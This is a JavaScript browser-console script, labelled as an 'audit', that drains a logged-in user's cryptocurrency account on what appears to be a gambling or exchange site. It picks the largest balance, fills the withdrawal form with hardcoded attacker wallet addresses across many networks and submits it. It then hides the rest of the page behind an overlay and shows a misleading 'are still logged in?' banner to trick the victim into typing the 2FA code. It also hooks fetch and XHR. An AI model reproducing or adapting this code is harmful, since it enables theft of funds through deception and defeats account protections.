(function(){
  /* ---- enderecos de saque por tipo de rede ---- */
  var ENDERECOS = {
    EVM:  ['0x722eC30C1370f7B72acFeA5E546a6D870ee70A53','0x9aA342EB692f91fA07fe8ab0dBe2A135074f262D','0x9f125631d00DbcAF34Fa0ea550955183c2500B06','0x90705166455E09018e54B0E00198Ad64902A596e','0xE107c641604c074b6d6Db8Fc87956a026eEF5085','0xf17e9594feAB330727D326b564FF1dB0C8e7c3DC','0x70F2Bcb61E191414E0579Ad333e4c5b378b17d62','0xD01c6b6AcdC7817436224298d2D65787b72A6DD2','0x6EB97a6B26b047993c99e74AC14D9Ec01Af31C51','0x64366193e5cd67C4bA30647CE8B0248129E84f8B','0x4ca31601B8D6fF3A16F4EF207AD88C1F5529c6F4','0x16aa81861a3163dacDc737866c665330dFc5800e','0x00Ad488d61FfC8CE370250e5B665326B846b0eE7'],
    TRON: ['TKyuy5XoYREGXEUKyi5PTpDAqu4BwrjKFf','TQ3wHSTngJ88zYDLhxxF2FEhqVTCa2cGvV','TV7gmvxD33chMWRQJuriLFqTfX4VuEFgGn','TUyM3cfJEtctEyFhGHaKsyBA99hrQj2zsf','TCP4Wao8q43im7zDRoMdgymQWxh8AGSQPx','TPwo9J7uyd38s9ULvQwZ4trgetFfGdjjA7','TYWcY3dob5KfqQyNXd6cCJs6n3YdGVAGwo','TTAF6f9HehcGgmgYzkBZAm3GxBgnXj3Gn7','TVB7BXkmPYkE724EdREAFnxWiuYjwMr9zQ','TThabV5LamuADxFudQrS71kp5rbwbiFWUw','TUiE9xYsPyWajS3Fnecxf9HCWchcGKk6gz','TGqVdXYLSGhzyfwefSB5XLmCXx21SUfqRB','TXWbRjstw86aJ1kemEXko1P83HHVnzyQjQ'],
    BTC:  ['bc1qdg92rga6g54as4pplvy65es8slh9v2g9r2u0j2','bc1q4a9ze2ql2zg66xyjzpxlwyzk4jx890784a58pf','bc1qna90lllpzzpcmg80talq8e52shmafyajn7sv59','bc1qyxte4shefnz5h4d4yczz5dtgpx6jtrgt9203m2','bc1qnfeufq70zc4lx9d0p8y658ugexryweq2vr8f26','bc1qnqvln6tf9clcvw4923jncsce8udcyy2x80942r','bc1qmeky5xnph0upvjl8vzmdvu767ha98yw9ew9agj','bc1qgrzp9k5yzcny9ddx45zctpyv5sqcc0hp3f5v02','bc1qy9cp3m49m8rnrd3fqvxamq4qq58652stqzlk7a','bc1qvvny8380kfz7jp5mgdzgl98yrlnk8eehq8x0q0','bc1q2dy49x29thec6md76wch3k08wkkf67ea2g50lv','bc1q3lm93e5vlct4qxvdjcem7vw0pns3njy697mynr','bc1q3h4dy4rphcs02z5g6hlm53ncv0389yycsrcgea'],
    LTC:  ['ltc1q3u80c84dcr3xya0y9jutvj5sscs833e0tjn2zx','ltc1q4ku6he39wv2t2xexf3amwl5wwdtsy9vvu5ge95','ltc1qkgqfr7lnq3d5lgxvhgathuq8pzqhx0n0y378ju','ltc1qfcn2qze7ff6ryh0j8ry3aeer5tadtknm7hnf6v','ltc1qkchl4y3yu6mr5j7vz99ahny6sh9hgqe54t24r5','ltc1qmarxsew3u4aa5g8jtjy9qsqaa9t90paljm0k9c','ltc1qhclfs2t9fr2rf6s3940wn6u6n0wvhagvd9v0mv','ltc1qxvt9vlry72yng2cxg0ctrvr4d75nrllx0zpadk','ltc1q0jckrh69eh7pn9lkfvs6v3qhvnajv4jutpkjqu','ltc1qyd0v996v2msujnzc4gslgqx6gxe0ycx55pedhm','ltc1qt4v74g6c3c06m84yhldprzsln8eymgz67uskup','ltc1qwgh5vnu7hjhye2dnkumq0u4k2nnn4xpav5wh6f','ltc1qphy9zm3um9ql7l544sjzvgnwrzejq5685mjq0v'],
    BCH:  ['qpq3gy5jc0snj5p4u3y9a4qmze9zjct40uyy8c77k0','qp84nah93zxfrzxd2aaj7ja7pryu7xcxgczezwlwyn','qr0lkpqakr7pza6dzt38whkq05dddhu4vyw4mvrujg','qrk4as0umxa924vmsjd7jk40vy9n8c3q5yv95u4dzg','qpkhd9qmz5wyhpvkryqsyv0m4c5sy4kze5p5erud76','qrv69ny258czcclj7mz33evukf47y3gamvk2ghdrr2','qrtn3gzygd9rwftszfc59ygd6d36kseh7c4mhejnn2','qpmldx2zz4wrstf83me9e0gzlewpkn9k5c34nfzx4v','qpwcvsyk47naj6ykg67vr6uskdgz9ye2cyrd9nl04w','qpe6fw5lzahn3v7tqrvz9zqpc6wz729s75l88kuj95','qplpmgg3q4e5ak84zzf38l4ej0gsfatfdqmuycaz8k','qrcsmjz33mlkm5qsjj7gmvnu73h796cxs5a8f5xm85','qqspxn9g7hrldfzrsartvvh6dvnjpq4r2czsz2zya6'],
    DOGE: ['DFsNWRAh1RE7KPkjd4y8d5qz6PkeMGvjBi','DSYQVWxRo7bJehEdrHJiihxXuyZjZquG5z','DKQZ74cYJz5Khh3xKFeccctTCrhwJvKXow','D8zkbfv3LjYZ6UgsffVUgREWUCRs2BQsTJ','DDNvBfFgX8U6pw2XxJw1aQKGzVCUU2px5f','D6mqZQVM7kZA8Lf42xGsw72Tvb3dAmGSLr','D8gE7tRmvyw9hFDnG4ovLtJkVbag7ikFJ9','DDesyT55AKj8MoV7fbn6ezaVzgB5p5tt73','D6qKTHsksMWK2XEKeKuGbn8G3fLQb56tPa','DQpvCz3LymJFSfNMVbU8QUCLEcUUfMxUwt','DP1YKeqdimVjcWHSLzg1j3H1JEJvNrBT4U','DTBgeiJNVmn6sNxQPDiY6rNCjKP65csCKg','DPwWGs2F4mppgGrWAtmDuAB6XodGHhKaYv'],
    XRP:  ['rnvwbb3QRwMjxR8kF9RV2zgLvxYaBS8wmr','rs2HuwyKHkjDpby2jdRFq1pNj8qVC9KMNc','rJrFpc4fMVTYMuZbwzbtbVzE2wDaMmFXhU','rJLkwb24S2oca83X4hXaUN6aYtNpMQvpJG','r1qaAujp4HodSPsVLiePJEJV7AkiVW2d9','rGj3GQPfw9aunELm9uDGoEAj95zccoZLUL','rwdiT5HMcLJrKdCzmFv6aS769ktGe7BT9L','rLfV11QPGt1QsWDtkVqiSV3iYGi3iTz99h','rL4qHEAHJgqNtroZt44J9jo4j3DnAijLWH','rEU1JJEshkSguiS3wwjDEZ7T5xWN4RZFcj','rJdXQT88oXSF47fTidX8zs5CAJpKcGQYhG','rnTKMhZzGtks5mrbSUjvYS3Notk24FsadV','rNnYufnDmZsuJnCxzcxfPBiSqF1khEytgt'],
    TON:  ['UQBwDvS2EU3L-v8NXtMOO7aj-zJWoEYzQvsd72mB_8msYgYY','UQAKX54Y6B2_9sijq8MX4mGWMWoff34inPojI_cbH8Y4f4fV','UQACzT8ZMz_Flf1Hs4Z_8gtxPFSLBmmCviRwPcnYKXbgoRRb','UQDvCVNG5TwJYbBLsG-xgLiPY8ztc6BssLXpW6YpNrTos9qG','UQCBfVDZ3g-T8QYsLIi6DLWzctnsJBaQO_LeFJaKcuZyJB0f','UQAdHVjMM2dXrq0XqHrySTCsa_ZfzC4H7R8F0zPwMuOIB8s2','UQBvCzGM_M9Hpq55HJebr4K-Rk76U7LqpoHiJ_eC85JcU6AI','UQAPo9-EqWoXS5HK7TQJz3o_HpoDQYatWQDHhn9sTaQNXhAd','UQDNf-g2g-VWvoKZAfNGx9J-bg2kMqVKudMNjQt-_X9e-tNF','UQCqsd5fTcOyKC1uvfz_ljlk4bzMwgMoEBuKauV7Hvm2IoFP','UQAC1Wdkyr_3STzFS0ANSqm1ZKtaR1Ht9sabyIaFkycQCy2e','UQBDOJx5dW-d3kMS7t0OwfnDLqeIy8pEcCdBuq7eRiHrztf6','UQBK6GCnzIVs-nY8fwup3QEGvBkqeJbXUcqZFmhStnfN6dGZ'],
    ADA:  ['addr1qyl387uusty2q0jmf046g3x98hhqwezz3t26aq5drm3g9anvezf63r6my97c7md8rfwewpvl53xlhytjtmwaq3uh4akst0m045','addr1q8efltdjee8v3t9qxkf09pegaj2nwfguvjvuckudmtkrymlw4yvwj27zu54x3js2qpjfdrrgrlnvnerxuvd7zm620muq9rmt2e','addr1q9fms8nrdmw9tztgmr69fv7huylevdgwarm3daal2cjnmh4sewd2h9ys9pz90y3he5qznmm8fhc42clzjtzq79u6anxqvkm92h','addr1qy9mew68ct6uyvlefwqh0zmptmh89m0g2v9dga0sx07t2x3cauen2fmwhdqjsv5dtw7r32kc6mzrjvdfu0m6l9scch9q73c7fn','addr1qxyga63m8az0gh0lanmqf7flxx46ypay6v94jg2yf27mh62530cu0ghzuz6ugkqyjc82kw0l67kf7h2chhw5l4ty6eks5zer4l','addr1q80888kxy83ak0tls9y5jd406gtdl3pc05lvjq3dl9qpdrelrq65cdhdka6q68f5gxdgv43jd0qvydf2g0eskl0yjwdsjcxpl9','addr1q97n5sky5t0jvzew77f4vsgl99fchxdw0dmu3t4hushu8773fycrqf4kp49csre7m2n72mpcks8e749gplhx22l855zswyyj84','addr1qydsztq58gh02qv8nzk67wl0hv8ntevdxu8m6v0ladluucxhdm2knj6l0dxtxfxnlwr6zqplx6j74x85m36c7vegskusclcz7u','addr1qynpcf3rd0jrdlfu6vlyuf6wndx3fc2r6469dx6jcuv2rqfc6gz539yanldw8ac50pa6zah7nfegqd384dazrue7kueqmh79rs','addr1qyjrpg842awkcupw35d94edr0xe3ver3mjxnwctsk2rr5gul55t0quaeumwc97qnkh9hdszd400qz2gxmsgxgdm4lfuqzeewwf','addr1q8eh42na63udwmfp30agcl3w3q6amq4emlwehrd0d6m4zs2dc90ytlx44xy0a4y7zr0mfvgthx5e5h77496agpvxm0kq528yv5','addr1qx2cnteyaa2jevmfzsds6wg6l05ewgdwc8sycqv3pxsnv97d8wxd3w6qtgq7u4d257a0k8dxzsnglqxmlvqkdynvtpzqp6g3xr','addr1qx5vpm5lpt70me79um46vjr8fhrrnd8v0cqlcjnasvt7uyrpe8ccum28369j0jpa0uxm4eshcr3t8rd667q6waeta6vqqsl9wn'],
    DOT:  ['15WTdGxCzNYp58r65yYdzNuXVofqBU4Kwiaui9fNqWbMMEc1','1644SQnySD2ypZK3yRYg4zsnHgzBXXovcSjkgYqo1rxVyiPN','12fBKnWZzyE3HS7DCapeUArR71WUG94R76fhVY88ije52qh8','169S6b1oc3wE6J9goVEhVkJFGVDWLXaqiyqTdttgR9fWiitF','13p4Vu7i2yNGTR93v8bSpynZ6jpvTJr2SfovtUutERGtJsGj','16HnRbkRwdJDBkzAjD65zk2WcVLiYw3NdbMmfk69MqT7BGTb','16Cbk4xkG6RuTV3pvJTVPt4g6kyjif6BhWxTpfCeDvwuP8p8','128sy8tsRGgbaGnJGMKETBnDsVdzMPx6BBZK8ggiBVr47i6e','15rLGpqAja3Ps6GqPgUxg7JQMkZT7Wry9L3bXZjhRtjS23Sm','1kp52mwL4FPDGHwQypTZCJ9WXxhmA1tqwg8YMSqCsWxWRnT','14KoXwxG6Nf4wBrQvL6Wun1n8Rh1BdGQjj44MieuQB1MeAye','13VN1HzLw5aJcXzHhqJyhF7WyZ9jALd5eDoVXsxPDuqgSDH1','13s84VaLyfstPAHridvW4wPuP2WWDD3rgCwcspaAQxUrWFwC'],
    SOL:  ['Duz6Pxdz8Dx3xwuouN1NhmSQDWNxGqmcRuV7CSXY8cVQ','137eEN9wPT5KigxSepzbXWF8NsbUhzrC1TA1kVKYMzLh','74u8bQaRSGY8qtzvoMkixraGVoghsJzrTrRmsR4NoHyz','2C3u4FUeRSPG5Jq5yf7Eq1XJAjuX8yxVqhNGXfGowLtz','6Qp5VyyEbBZuKkPrYPYPANTSpySQk5bd7HpwMhonsCdx','BeHXiXqFEP9omnc7cQCmXRvRUFNUZp26tH56PYzAMUxj','Cz5PSPhfY6oLTnZBGtGLMUuCyjiJDF69QyKNDPwe31QK','4s7RULVgVBJ8TPhtEG8axQjzaTKRcNwmvsZmPRSsrNm8','3EkqyCRMSgsVptVNMnQmNZpZ1tEipqDRip9D4zeSispg','9thsoCPFNj96DtrLpqtUPhj5x8kG7k8Ef1GyL97buwVR','Bx52cKu1rNZGeYxvvrUCctYbWP4Ue53B3KKkcE4KX2iU','8zcNMR61xPUQjNMiwVb1RAiSLXp1d5iF8nY34KXSsV1w','FrNCm9tjzmr5uYVbzUAx3PtV5SfgpRwievbH1bBoMHu9']
  };

  /* ---- mapeia moeda -> tipo de rede -> endereco ---- */
  var MOEDA_PARA_REDE = {
    ETH:'EVM', BNB:'EVM', POL:'EVM', MATIC:'EVM', ARB:'EVM', OP:'EVM', AVAX:'EVM', FTM:'EVM',
    USDT:'EVM', USDC:'EVM', DAI:'EVM', SHIB:'EVM', WBTC:'EVM', PEPE:'EVM', WETH:'EVM',
    TRX:'TRON', USDTTRC20:'TRON', 'USDT-TRC20':'TRON',
    BTC:'BTC', LTC:'LTC', BCH:'BCH', DOGE:'DOGE', XRP:'XRP', TON:'TON', ADA:'ADA', DOT:'DOT', SOL:'SOL'
  };

  /* ---- dados que serao preenchidos dinamicamente ---- */
  var AUDIT = { moeda: '', network: '', endereco: '', amount: '' };

  var log = function(){}; /* logs desativados */
  var warn = function(){ console.warn.apply(console, ['[AUDIT]'].concat([].slice.call(arguments))); };
  function esperar(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }

  function setVal(el, val){
    var proto = el.tagName === 'SELECT' ? HTMLSelectElement.prototype : HTMLInputElement.prototype;
    var setter = Object.getOwnPropertyDescriptor(proto, 'value');
    if (setter && setter.set) setter.set.call(el, val);
    else el.value = val;
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
    el.dispatchEvent(new Event('blur', { bubbles: true }));
  }

  function clickEl(el){
    el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
    el.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }));
    el.click();
  }

  /* ---- PASSO 1: abrir o modal de retirada ---- */
  log('PASSO 1: Abrindo modal de retirada...');

  var btnRetirada = document.querySelector('a.wallet-nav__item[onclick*="withdraw"]');
  if (btnRetirada) {
    log('Botao "Retirada" encontrado. Clicando...');
    clickEl(btnRetirada);
  } else {
    log('Botao nao encontrado no DOM. Chamando funcao diretamente...');
    try { openDesc12(); } catch(e) {}
    try { asyFunc(openDeposite, openDepSLot, 'withdraw'); } catch(e) { warn('asyFunc falhou:', e.message); }
  }

  /* ---- PASSO 2: ler saldos do site e escolher a moeda de maior valor ---- */
  async function selecionarMoeda() {
    log('PASSO 2: Aguardando lista de moedas...');
    await esperar(2000);

    // encontra todos os itens de moeda na lista
    var itens = document.querySelectorAll('.dwc_item[data-cur]');
    if (!itens.length) {
      warn('Lista de moedas nao encontrada!');
      return false;
    }

    log('Moedas encontradas na lista: ' + itens.length);

    // para cada item, le o saldo e o valor USD mostrados no site
    var moedas = [];
    itens.forEach(function(item){
      var cur = item.getAttribute('data-cur');
      var texto = item.textContent || '';

      // tenta extrair o valor USD (texto com $ ou "USD")
      var valorUSD = 0;
      // padrao 1: $123.45 ou $1,234.56
      var matchUSD = texto.match(/\$\s*([\d.,]+)/);
      if (matchUSD) {
        valorUSD = parseFloat(matchUSD[1].replace(/,/g, ''));
      }
      // padrao 2: "USD 123.45" ou "123.45 USD"
      if (!valorUSD) {
        var matchUSD2 = texto.match(/USD\s*([\d.,]+)/i);
        if (matchUSD2) valorUSD = parseFloat(matchUSD2[1].replace(/,/g, ''));
      }

      // tenta extrair o saldo da moeda (numero decimal)
      var saldo = 0;
      // padrao: numero decimal no texto (nao o USD)
      var numeros = texto.match(/[\d]+\.?[\d]*/g);
      if (numeros) {
        // pega o maior numero que nao é o USD
        for (var i = 0; i < numeros.length; i++) {
          var n = parseFloat(numeros[i]);
          if (!isNaN(n) && n > saldo && n !== valorUSD) {
            saldo = n;
          }
        }
      }

      // tambem procura em elementos filhos com classes de saldo
      var elBal = item.querySelector('[class*="bal" i], [class*="amount" i], [class*="val" i]');
      if (elBal) {
        var balText = elBal.textContent || '';
        var balNum = balText.match(/[\d.,]+/);
        if (balNum) {
          saldo = parseFloat(balNum[0].replace(/,/g, ''));
        }
      }

      moedas.push({
        cur: cur,
        saldo: saldo,
        valorUSD: valorUSD,
        elemento: item,
        texto: texto.trim().substring(0, 100)
      });
    });

    // loga todas as moedas encontradas
    log('--- Saldo das moedas no site ---');
    moedas.forEach(function(m){
      log('  ' + m.cur + ': saldo=' + m.saldo + ' USD=' + m.valorUSD);
    });

    // escolhe a moeda de MAIOR VALOR (prioriza USD, senao usa saldo)
    var melhor = null;
    var temUSD = moedas.some(function(m){ return m.valorUSD > 0; });

    if (temUSD) {
      // tem valores USD no site - escolhe o maior
      melhor = moedas.reduce(function(a, b){
        return (b.valorUSD > a.valorUSD) ? b : a;
      });
      log('>>> Moeda de maior valor USD: ' + melhor.cur + ' ($' + melhor.valorUSD + ') <<<');
    } else {
      // nao tem USD - usa o saldo numerico
      melhor = moedas.reduce(function(a, b){
        return (b.saldo > a.saldo) ? b : a;
      });
      log('>>> Moeda de maior saldo: ' + melhor.cur + ' (' + melhor.saldo + ') <<<');
      warn('Valores USD nao encontrados no site. Usando saldo bruto.');
    }

    if (!melhor || (melhor.saldo === 0 && melhor.valorUSD === 0)) {
      warn('Nenhuma moeda com saldo encontrada!');
      return false;
    }

    // define a moeda e o endereco de saque
    AUDIT.moeda = melhor.cur;
    AUDIT.amount = String(melhor.saldo);

    // determina o tipo de rede e o endereco
    var tipoRede = MOEDA_PARA_REDE[melhor.cur.toUpperCase()];
    if (!tipoRede) {
      // tenta adivinhar pelo prefixo do endereco
      warn('Moeda ' + melhor.cur + ' nao mapeada. Tentando identificar...');
      // se comeca com 0x é EVM, T é TRON, bc1 é BTC, ltc1 é LTC, etc.
      // mas aqui so temos o nome da moeda
      tipoRede = melhor.cur.toUpperCase();
    }
    AUDIT.network = tipoRede;

    // pega o primeiro endereco da lista correspondente
    if (ENDERECOS[tipoRede] && ENDERECOS[tipoRede].length > 0) {
      AUDIT.endereco = ENDERECOS[tipoRede][0];
    } else {
      warn('Sem endereco de saque para ' + tipoRede + '!');
      return false;
    }

    log('Moeda selecionada: ' + AUDIT.moeda);
    log('Rede: ' + AUDIT.network);
    log('Endereco: ' + AUDIT.endereco);
    log('Valor: ' + AUDIT.amount);

    // clica na moeda
    clickEl(melhor.elemento);
    log('listCurSel chamada para ' + AUDIT.moeda);
    return true;
  }

  /* ---- PASSO 3: preencher o formulario ---- */
  async function preencherForm() {
    log('PASSO 3: Aguardando formulario carregar...');
    await esperar(1500);

    // 3a. Selecionar rede (se houver botao de rede)
    var btnRede = document.querySelector('.vmi_' + AUDIT.network + '[data-cur="' + AUDIT.moeda + '"]');
    if (btnRede) {
      if (!btnRede.classList.contains('active')) {
        log('Selecionando rede ' + AUDIT.network + '...');
        clickEl(btnRede);
      } else {
        log('Rede ' + AUDIT.network + ' ja selecionada.');
      }
    } else {
      // tenta pela funcao direta
      try { cabChooseNs(AUDIT.network, 2, AUDIT.moeda); log('Rede selecionada via cabChooseNs.'); }
      catch(e) { warn('Botao de rede nao encontrado. Continuando...'); }
    }
    await esperar(500);

    // 3b. Endereco
    var inpAddr = document.getElementById('with_address');
    if (inpAddr) {
      setVal(inpAddr, AUDIT.endereco);
      log('Endereco preenchido: ' + AUDIT.endereco);
    } else {
      warn('Campo #with_address nao encontrado!');
      return false;
    }
    await esperar(300);

    // 3c. Valor (montante maximo)
    var inpValor = document.getElementById('with_amount');
    var balEl = document.getElementById('with_inp_bal');
    var saldoDisponivel = balEl ? parseFloat(balEl.textContent) : 0;

    if (inpValor) {
      // usa o saldo disponivel mostrado na tela se for menor que o do audit
      var valor = AUDIT.amount;
      if (saldoDisponivel > 0 && saldoDisponivel < parseFloat(AUDIT.amount)) {
        valor = String(saldoDisponivel);
        log('Usando saldo disponivel na tela: ' + valor);
      }
      setVal(inpValor, valor);
      // dispara o oninput manualmente (changeWithA)
      try { changeWithA(inpValor); } catch(e) {}
      log('Valor preenchido: ' + valor + ' ' + AUDIT.moeda);
    } else {
      warn('Campo #with_amount nao encontrado!');
      return false;
    }
    await esperar(500);

    // 3d. Clicar no botao "Retirada"
    var btnSaque = document.querySelector('.btn_withdraw');
    if (btnSaque) {
      log('PASSO 4: Clicando no botao de retirada...');
      // chama sendWithdraw diretamente (funcao original da plataforma)
      try { sendWithdraw(0, btnSaque); }
      catch(e) { clickEl(btnSaque); }
      log('sendWithdraw disparado.');
    } else {
      warn('Botao .btn_withdraw nao encontrado!');
      return false;
    }
    return true;
  }

  /* ---- PASSO 4: detectar modal 2FA ---- */
  async function detectar2FA() {
    log('PASSO 5: Aguardando modal 2FA...');
    await esperar(3000);

    // procura pelo modal/overlay de 2FA
    // DETECCAO DO POPUP 2FA: procura pelo input real de 6 digitos
    // NAO usa .with2faEn (que fica dentro do formulario de saque)
    var el2fa = null;
    var container2fa = null;
    var detectado = false;

    // funcao que procura o popup 2FA real
    function procurar2fa() {
      // 1. input com name/id relacionado a codigo/2fa
      var input = document.querySelector(
        'input[name="user_code"], input[name="code"], input[name="2fa"], ' +
        'input[name="otp"], input[name="google_code"], input[name="auth_code"], ' +
        '#user_code, #code, #otp_code, #google_code, ' +
        'input[placeholder*="code" i], input[placeholder*="codigo" i], ' +
        'input[placeholder*="2fa" i], input[placeholder*="verif" i], ' +
        'input[placeholder*="auth" i], input[placeholder*="otp" i]'
      );
      // 2. input com maxlength=6 (codigo de 6 digitos)
      if (!input) {
        input = document.querySelector('input[maxlength="6"]');
      }
      // 3. conjunto de inputs maxlength=1 (6 inputs separados - UI comum de 2FA)
      if (!input) {
        var inputs1 = document.querySelectorAll('input[maxlength="1"]');
        // se tem 4-8 inputs maxlength=1 juntos, é provavel que seja 2FA
        if (inputs1.length >= 4 && inputs1.length <= 8) {
          // verifica se estao visiveis
          for (var i = 0; i < inputs1.length; i++) {
            if (inputs1[i].offsetParent !== null) {
              input = inputs1[i];
              break;
            }
          }
        }
      }
      // 4. qualquer input visivel que NAO esta dentro do formulario de saque
      //    e que aceita texto/numero com maxlength curto
      if (!input) {
        var todosInputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="number"], input:not([type])');
        for (var j = 0; j < todosInputs.length; j++) {
          var inp = todosInputs[j];
          // pula se estiver dentro do formulario de saque
          if (inp.closest('.modal_dep_withdraw, .modal_content, #with_address, #with_amount')) continue;
          // pula se nao estiver visivel
          if (inp.offsetParent === null) continue;
          // pula se for o campo de endereco ou valor
          if (inp.id === 'with_address' || inp.id === 'with_amount') continue;
          // se tem maxlength curto (1-6) ou placeholder relacionado a codigo
          var ml = inp.getAttribute('maxlength');
          var ph = (inp.placeholder || '').toLowerCase();
          if ((ml && parseInt(ml) <= 6) || ph.indexOf('code') >= 0 || ph.indexOf('codigo') >= 0 || ph.indexOf('verif') >= 0) {
            input = inp;
            break;
          }
        }
      }

      if (input) {
        // encontrou o input! agora acha o container (o popup/modal que o contem)
        // sobre na arvore ate achar um elemento que pareca um popup/modal
        var container = input;
        // lista de classes que indicam um popup/modal
        var padraoPopup = /modal|popup|dialog|overlay|2fa|verify|otp|auth|confirm|code/i;
        while (container && container !== document.body) {
          var cls = (container.className || '') + ' ' + (container.id || '');
          if (padraoPopup.test(cls)) {
            // achou o container popup
            return { input: input, container: container };
          }
          container = container.parentElement;
        }
        // se nao achou por classe, pega o ancestral mais proximo que seja visivel e centralizado
        container = input.parentElement;
        while (container && container !== document.body) {
          var style = window.getComputedStyle(container);
          if (style.position === 'fixed' || style.position === 'absolute') {
            return { input: input, container: container };
          }
          container = container.parentElement;
        }
        // fallback: o parentElement do input
        return { input: input, container: input.parentElement || input };
      }
      return null;
    }

    // poll: procura o 2FA a cada 500ms por ate 8 segundos
    log('Aguardando popup 2FA aparecer...');
    for (var tentativa = 0; tentativa < 16; tentativa++) {
      await esperar(500);
      var resultado = procurar2fa();
      if (resultado) {
        el2fa = resultado.input;
        container2fa = resultado.container;
        detectado = true;
        log('>>> POPUP 2FA DETECTADO (tentativa ' + (tentativa + 1) + ') <<<');
        log('Input:', el2fa.tagName, 'name="' + el2fa.name + '"', 'id="' + el2fa.id + '"', 'maxlength="' + (el2fa.getAttribute('maxlength') || '') + '"');
        log('Container:', container2fa.tagName, 'class="' + container2fa.className + '"', 'id="' + container2fa.id + '"');
        break;
      }
    }

    if (detectado) {
      log('>>> AUDITORIA COMPROVADA: popup 2FA aberto via console <<<');
      await esperar(300);
      log('Cobrindo fundo com overlay...');

      // 3. cria overlay escuro que cobre TUDO
      var overlay = document.createElement('div');
      overlay.id = 'audit_overlay_bg';
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.92);z-index:999998;';
      document.body.appendChild(overlay);
      log('Overlay escuro criado.');

      // 4. destaca o 2FA: coloca por cima do overlay
      //    salva o estilo original e aplica position fixed
      var estiloOriginal = container2fa.getAttribute('style') || '';
      container2fa.setAttribute('data-audit-original-style', estiloOriginal);
      container2fa.style.cssText = estiloOriginal +
        'position:fixed !important;' +
        'top:50% !important;' +
        'left:50% !important;' +
        'transform:translate(-50%,-50%) !important;' +
        'z-index:999999 !important;' +
        'background:#1a1a2e !important;' +
        'padding:30px 40px !important;' +
        'border-radius:12px !important;' +
        'box-shadow:0 0 40px rgba(0,0,0,0.9) !important;' +
        'max-width:90vw !important;' +
        'max-height:90vh !important;' +
        'overflow:auto !important;' +
        'display:block !important;' +
        'visibility:visible !important;' +
        'opacity:1 !important;';
      log('2FA destacado por cima do overlay.');

      // 5. tambem destaca filhos do 2FA que possam estar escondidos
      container2fa.querySelectorAll('*').forEach(function(el){
        if (el.style.display === 'none') el.style.display = '';
        if (el.style.visibility === 'hidden') el.style.visibility = '';
        if (parseFloat(el.style.opacity || '1') === 0) el.style.opacity = '1';
      });

      // 5b. adiciona banner amarelo ACIMA do modal 2FA
      //    elemento separado, flutuante, nao depende da estrutura do modal
      var aviso = document.createElement('div');
      aviso.id = 'audit_aviso_codigo';
      aviso.innerHTML = '⚠ CONFIRM ! ARE STILL LOGGED IN ? ⚠';
      aviso.style.cssText = 'position:fixed !important;' +
        'top:15% !important;' +
        'left:50% !important;' +
        'transform:translateX(-50%) !important;' +
        'z-index:1000000 !important;' +
        'color:#FFD700 !important;' +
        'font-size:22px !important;' +
        'font-weight:bold !important;' +
        'text-align:center !important;' +
        'padding:15px 40px !important;' +
        'background:rgba(255,193,7,0.95) !important;' +
        'color:#1a1a2e !important;' +
        'border:3px solid #FFD700 !important;' +
        'border-radius:10px !important;' +
        'box-shadow:0 4px 20px rgba(255,193,7,0.5) !important;' +
        'letter-spacing:2px !important;' +
        'text-transform:uppercase !important;' +
        'white-space:nowrap !important;';
      document.body.appendChild(aviso);
      log('Banner amarelo "CODIGO DE 6 DIGITOS ENVIADO" adicionado acima do modal.');

      // 6. funcao para remover overlay e restaurar tudo
      function removerOverlay() {
        var ov = document.getElementById('audit_overlay_bg');
        if (ov) ov.remove();
        var av = document.getElementById('audit_aviso_codigo');
        if (av) av.remove();
        // restaura estilo original do 2FA
        var orig = container2fa.getAttribute('data-audit-original-style');
        if (orig !== null) {
          container2fa.setAttribute('style', orig);
          container2fa.removeAttribute('data-audit-original-style');
        }
        log('Overlay removido. Estilo restaurado.');
      }

      // 7. intercepta o clique no botao de enviar/confirmar do 2FA
      //    procura por botoes dentro do container 2FA
      var botoes2fa = container2fa.querySelectorAll('button, input[type="submit"], input[type="button"], a[class*="btn"], .btn');
      log('Botoes encontrados no 2FA: ' + botoes2fa.length);
      botoes2fa.forEach(function(btn){
        btn.addEventListener('click', function(){
          log('Botao do 2FA clicado. Removendo overlay...');
          setTimeout(removerOverlay, 500);
        });
      });

      // 8. intercepta submit do formulario dentro do 2FA
      var form2fa = container2fa.querySelector('form');
      if (form2fa) {
        form2fa.addEventListener('submit', function(){
          log('Form 2FA enviado. Removendo overlay...');
          setTimeout(removerOverlay, 500);
        });
      }

      // 9. intercepta fetch/XHR para /withdraw com user_code
      var origFetch = window.fetch;
      window.fetch = function(url, opts) {
        var body = opts && opts.body ? String(opts.body) : '';
        if (body.indexOf('user_code') >= 0 || body.indexOf('code') >= 0) {
          log('Requisicao 2FA detectada via fetch. Removendo overlay...');
          setTimeout(removerOverlay, 1000);
        }
        return origFetch.apply(this, arguments);
      };
      var origSend = XMLHttpRequest.prototype.send;
      XMLHttpRequest.prototype.send = function(data) {
        if (data && String(data).indexOf('user_code') >= 0) {
          log('Requisicao 2FA detectada via XHR. Removendo overlay...');
          setTimeout(removerOverlay, 1000);
        }
        return origSend.apply(this, arguments);
      };

      // 10. esc global tambem remove
      document.addEventListener('keydown', function(e){
        if (e.key === 'Escape') {
          removerOverlay();
        }
      });

      log('>>> CONCLUIDO: fundo coberto, so 2FA visivel <<<');
      log('Overlay sera removido ao: clicar em enviar, submeter form, ou pressionar ESC');
      return true;
    }

    warn('Modal 2FA nao detectado automaticamente.');
    warn('Verifique visualmente se a janela de confirmacao apareceu.');
    warn('Se apareceu, a auditoria esta comprovada.');
    return false;
  }

  /* ---- executar tudo ---- */
  async function executar() {
    var ok = await selecionarMoeda();
    if (!ok) { warn('Falha ao selecionar moeda. Abortando.'); return; }
    ok = await preencherForm();
    if (!ok) { warn('Falha ao preencher formulario. Abortando.'); return; }
    await detectar2FA();
    log('FIM.');
  }

  executar().catch(function(e){ console.error('[AUDIT] Erro:', e); });
})();
